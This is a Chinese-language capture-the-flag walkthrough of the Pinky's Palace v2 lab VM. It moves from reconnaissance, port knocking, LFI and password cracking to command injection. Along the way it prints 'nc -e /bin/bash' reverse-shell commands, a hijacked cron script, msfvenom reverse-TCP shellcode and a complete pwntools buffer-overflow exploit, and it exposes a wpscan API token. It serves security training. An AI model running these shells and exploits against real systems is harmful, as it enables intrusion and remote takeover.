该官方作者需要执行命令：echo 192.168.4.178 pinkydb | sudo tee -a /etc/hosts

1、nmap -p- 192.168.2.157 -A

80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
Just another WordPress site
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite

开放了80、4655、7654、31337端口，这是wordpress框架的web，wpscan要用上了！


2、web信息探测

根据作者的添加hosts指向后访问：
http://pinkydb/

https://wpscan.com/register  ---拿令牌
kJ4bhZCgveCcoGJPER7AOsHJTeFDf90Wfj9zu0V6asc


wpscan --url http://pinkydb/ -eu --api-token kJ4bhZCgveCcoGJPER7AOsHJTeFDf90Wfj9zu0V6asc

枚举出账号：pinky1337
和很多高危漏洞！


dirb http://pinkydb/ /usr/share/dirb/wordlists/big.txt
http://pinkydb/wp-login.php    ----后台登录地址
http://pinkydb/secret/     ----存在bambam.txt文件


3、端口敲震随机性
http://pinkydb/secret/bambam.txt
8890
7000
666
发现三个端口信息！


项目六知识点，端口碰撞：
knock pinkydb 8890 7000 666
knock pinkydb 8890 666 7000
knock pinkydb 7000 8890 666
knock pinkydb 7000 666 8890
knock pinkydb 666 8890 7000
knock pinkydb 666 7000 8890
这里问题挺大！随机性测试敲震！



nmap -p- 192.168.4.184
80/tcp    open  http
4655/tcp  open  unknown
7654/tcp  open  unknown
31337/tcp open  Elite
nmap -p4655,7654,31337 
这时候经过端口敲震，都开放了！

nmap -p4655,7654,31337 192.168.2.159 -A
4655/tcp  open  ssh     OpenSSH 7.4p1   ---ssh登录
7654/tcp  open  http    nginx 1.10.3    ---nginx中间件服务
31337/tcp open  Elite?    ---这里枚举出了很多登录界面，存在溢出？


4、web信息枚举
访问：http://pinkydb:7654/
这是一个登录页面！http://pinkydb:7654/login.php

继续dirb爆破7654端口！

dirb http://pinkydb:7654/ /usr/share/dirb/wordlists/big.txt
无法枚举：？？
dirb http://pinkydb:7654/ /usr/share/dirb/wordlists/big.txt
发现apache目录！

枚举页面：curl http://192.168.4.178:7654/apache/wp-config.php
--------------
/** MySQL database username */
define('DB_USER', 'pinkywp');

/** MySQL database password */
define('DB_PASSWORD', 'pinkydbpass_wp');
--------------
数据库用户名密码泄露！！通过ssh、后台登录页面都无法进入，也未开启3306端口！


5、暴力破解ssh

cewl http://pinkydb > dayu.txt

然后用2022.2最新版Burpsuite进行暴力破解！
Status:	302
Length:	728
user=pinky&pass=Passione   ---获得正确用户名密码

登录：http://pinkydb:7654/login.php
pinky
Passione

登录进去后出现：Stefano's RSA Notes

cat id_rsa   ---发现这是rsa的密匙信息

chmod 400 id_rsa
ssh stefano@192.168.2.159 -p 4655 -i id_rsa
Enter passphrase for key 'id_rsa':
可看到尝试登录，还存在一层密码信息！！！


john暴力破解ssh：
/usr/share/john/ssh2john.py id_rsa > dayu_rsa
john --wordlist=/usr/share/wordlists/rockyou.txt dayu_rsa
secretz101       (id_rsa)
成功爆破获得密码信息！

那么目前不知道用户信息！

http://pinkydb:7654/pageegap.php?1337=filesselif1001.php
?1337=   ---看到熟悉的界面
http://pinkydb:7654/pageegap.php?1337=../../../etc/passwd   ---发现回显空白页面？
http://pinkydb:7654/pageegap.php?1337=/etc/passwd   ---存在LFI文件包含漏洞

stefano   ---获得用户名

ssh stefano@192.168.4.184 -p 4655 -i id_rsa
secretz101
成功登录stefano用户！


6、内网信息收集

脚本枚举linpeas
python -m SimpleHTTPServer 8081
wget http://192.168.4.171:8081/linpeas.sh
chmod +x linpeas.sh

1）存在用户：
demon、pinky、stefano
2）127.0.0.1:3306
pinkywp
pinkydbpass_wp
mysql -upinkywp -ppinkydbpass_wp
通过数据库知道账号密码：MD5加密无法解密
pinky1337  $P$BqBoittC5WZl0XUL8GVKO1t9R6HcJU/



7、LFI+命令注入漏洞

-----------------------
cd tools/
cat note.txt
Pinky made me this program so I can easily send messages to him.
md5sum qsub 
md5sum: qsub: Permission denied
发现无权限查看！
./qsub 
./qsub <Message>
只能操作！！

./qsub $(python -c "print 'A'*100")
secretz101
[!] Incorrect Password!
当输出：Bad hacker! Go away!  ---说我是黑客，无法操作！！！
-----------------------

http://pinkydb:7654/pageegap.php?1337=/home/stefano/tools/qsub
通过文件包含查看该文件：
/bin/echo %s >> /home/pinky/messages/stefano_msg.txt%s TERM[+] Input Password: %sBad hacker! Go away![+] Welcome to Question Submit![!] Incorrect Password!
发现需要输入：
1）/bin/echo %s >> /home/pinky/messages/stefano_msg.txt
2）TERM
3）执行命令
那么需要知道TERM环境变量是什么！
echo $TERM
xterm-256color   ---这就是密码


执行命令反弹shell：
nc -vlp 8899   ---kali执行
./qsub dayu
/bin/echo %s >> /home/pinky/messages/stefano_msg.txt
./qsub '$(nc -e /bin/bash 192.168.2.157 8899)'
xterm-256color
python -c 'import pty; pty.spawn("/bin/bash")'

成功获得反弹shell！成功进入pinky用户！


8、pinky用户信息枚举

枚举了group用户组信息后发现：
/usr/local/bin/backup.sh

ls -la /usr/local/bin/backup.sh
-rwxrwx--- 1 demon pinky 113 Mar 17  2018 /usr/local/bin/backup.sh
文件由用户demo和组pinky拥有！由于前面命令注入漏洞获得的shell状态下是没有权限读取和写入该文件，但是该文件在pinky GID中！新起个group组权限：

id
uid=1000(pinky) gid=1002(stefano) groups=1002(stefano)
pinky@Pinkys-Palace:~/tools$ newgrp
pinky@Pinkys-Palace:~/tools$ id
uid=1000(pinky) gid=1000(pinky) groups=1000(pinky),1002(stefano)
可看到通过newgrp加入了GID权限！这时候就可以读写backup文件了！
https://www.runoob.com/linux/linux-comm-newgrp.html


echo "nc -e /bin/bash 192.168.2.157 1233" > backup.sh
kali开启监听，等待3分钟左右获得反弹shell！
python -c 'import pty; pty.spawn("/bin/bash")'

从stefano->pinky->demon用户一步步渗透的过程！

写入rsa key：
cd ~/.ssh
echo '' > authorized_keys
ssh demon@192.168.2.159 -p 4655 -i id_rsa


9、demon用户信息枚举


linpeas信息枚举：
/etc/systemd/system/daemon.service is calling this writable executable: /daemon/panel
 16K -rwxr-x--- 1 demon demon  13K Mar 17  2018 /daemon[0m/panel
发现panel文件深橙色存在溢出？？

-rwxr-x---  1 demon demon 13280 Mar 17  2018 panel
发现这是demon权限，看看运行：
ps aux | grep panel
root        477  0.0  0.0   4040   900 ?        Ss   19:20   0:00 /daemon/panel
root权限在后台执行！！！


10、缓冲区溢出
file panel 
panel: ELF 64-bit LSB executable, x86-64
64位的缓冲区溢出！

执行后一直回显：
[-] binding to socket
[-] binding to socket
......
这应该是31337的程序！


文件传输到本地：
nc -nlvp 1111 > panel
nc 192.168.2.159 1111 < panel


gdb panel
run   ----运行该程序，就会挂起并开启31337端口！
echo $(python -c "print 'A'*500") | nc localhost 31337
执行发现0x00000000004009aa in handlecmd ()  存在缓冲区溢出！

pkill -9 panel; pkill -i panel   ---强制关闭进程，否则无法关闭的！


2、查找缓冲区溢出偏移量
gdb panel
pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'

nc -v localhost 31337

pattern_offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 120
可看到偏移量为120！

3、shellcode编写

msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.2.157 LPORT=6666 -b '\x00\x0a\x0b' -f python

这边使用msfvenom生成shellcode，注意程序使用strcpy来触发溢出，所以shellcode里不能含有null字符，不然会截断！

buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x46\x46\xf4\xda\xf9\x21\xc1"
buf += b"\xbe\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x2c\x6f\xac\x43\x93\x23\x9e\xd4\x47\x18\xfb\xdf\xb1"
buf += b"\xb6\x89\x07\x44\x46\xee\xd0\x39\x89\xc3\x23\x17\x0e"
buf += b"\x7d\x3c\x93\x31\x9b\xd4\x6c\x1e\xfb\xdf\x93\x22\x9f"
buf += b"\xf6\xb9\x88\x9e\xfb\xa1\x2e\xc4\xcb\xb0\x2c\xcf\x82"
buf += b"\x60\x69\x7a\x91\x24\x2f\x9a\xf5\x8a\x49\xc1\xed\x0e"
buf += b"\xcf\x13\x88\xae\x69\x48\x58\x49\x43\xf4\xda\xf9\x21"
buf += b"\xc1\xbe"


4、编写EXP

1）探测填充
-----------
from pwn import *

HOST, PORT = "localhost", 31337

payload = ''
payload += 'A'*120
payload += 'BBBB0000'
payload += 'C'*30

r = remote(HOST,PORT)
r.recvuntil("=> ")
r.sendline(payload)
-----------

2）存在jmp rsp
-----------
from pwn import *

HOST, PORT = "localhost", 31337

payload = ''
payload += 'A'*120
payload += p64(0x400cfb).decode('unicode_escape')    ----将数字转换为字符
payload += 'C'*30

r = remote(HOST,PORT)
r.recvuntil("=> ")           ----将字符串输出
r.sendline(payload)          ----将payload数据给程序或者服务器
-----------
p64(0x00400596).decode('unicode_escape')报错：
使用p64()时报错：TypeError: can only concatenate str (not “bytes“) to str：
参考：https://blog.csdn.net/qq_39772215/article/details/110294527

3）本地反弹shell--exp编写

-----------
from pwn import *

HOST, PORT = "localhost", 31337

buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x46\x46\xf4\xda\xf9\x21\xc1"
buf += b"\xbe\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x2c\x6f\xac\x43\x93\x23\x9e\xd4\x47\x18\xfb\xdf\xb1"
buf += b"\xb6\x89\x07\x44\x46\xee\xd0\x39\x89\xc3\x23\x17\x0e"
buf += b"\x7d\x3c\x93\x31\x9b\xd4\x6c\x1e\xfb\xdf\x93\x22\x9f"
buf += b"\xf6\xb9\x88\x9e\xfb\xa1\x2e\xc4\xcb\xb0\x2c\xcf\x82"
buf += b"\x60\x69\x7a\x91\x24\x2f\x9a\xf5\x8a\x49\xc1\xed\x0e"
buf += b"\xcf\x13\x88\xae\x69\x48\x58\x49\x43\xf4\xda\xf9\x21"
buf += b"\xc1\xbe"

payload = buf
payload += b'A'*(120-len(buf))
payload += p64(0x400cfb)
print(payload)

r = remote(HOST,PORT)
r.recvuntil(b"=>")
r.sendline(payload)
-----------

4）最终payload

------
from pwn import *

HOST, PORT = "pinkydb", 31337

buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x46\x46\xf4\xda\xf9\x21\xc1"
buf += b"\xbe\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x2c\x6f\xac\x43\x93\x23\x9e\xd4\x47\x18\xfb\xdf\xb1"
buf += b"\xb6\x89\x07\x44\x46\xee\xd0\x39\x89\xc3\x23\x17\x0e"
buf += b"\x7d\x3c\x93\x31\x9b\xd4\x6c\x1e\xfb\xdf\x93\x22\x9f"
buf += b"\xf6\xb9\x88\x9e\xfb\xa1\x2e\xc4\xcb\xb0\x2c\xcf\x82"
buf += b"\x60\x69\x7a\x91\x24\x2f\x9a\xf5\x8a\x49\xc1\xed\x0e"
buf += b"\xcf\x13\x88\xae\x69\x48\x58\x49\x43\xf4\xda\xf9\x21"
buf += b"\xc1\xbe"

payload = buf
payload += b'A'*(120-len(buf))
payload += p64(0x400cfb)
print(payload)

r = remote(HOST,PORT)
r.recvuntil(b"=>")
r.sendline(payload)
------



拓展拓展：
1）shellcode
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.2.157 LPORT=6666 -b '\x00\x0a\x0b' -f python -o 1

msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.2.157 LPORT=6666 -a x64 --platform linux -b '\x00\x0a\x0b' -f py


参考基础学习：
https://ch4r1l3.github.io/2018/07/19/pwn从入门到放弃第四章——pwntools的基本使用教程/


2）IDA分析

要求输入密码，将其与TERM环境变量进行比较，如果匹配，则将第一个程序参数 ( argv[1]) 传递给send函数。所以让我们看一下send函数！
./qsub ';/bin/bash; #'
然后写入rsa即可！

3）魔法shell稳定

script -c /bin/bash /dev/null
Ctrl-Z回到我们的 bash shell。使用 stty raw -echo 关闭回显，然后输入 fg 并按回车键（您将看不到 fg）。这将使我们的 Netcat shell 恢复。键入重置，按回车键，然后输入有效TERM类型！





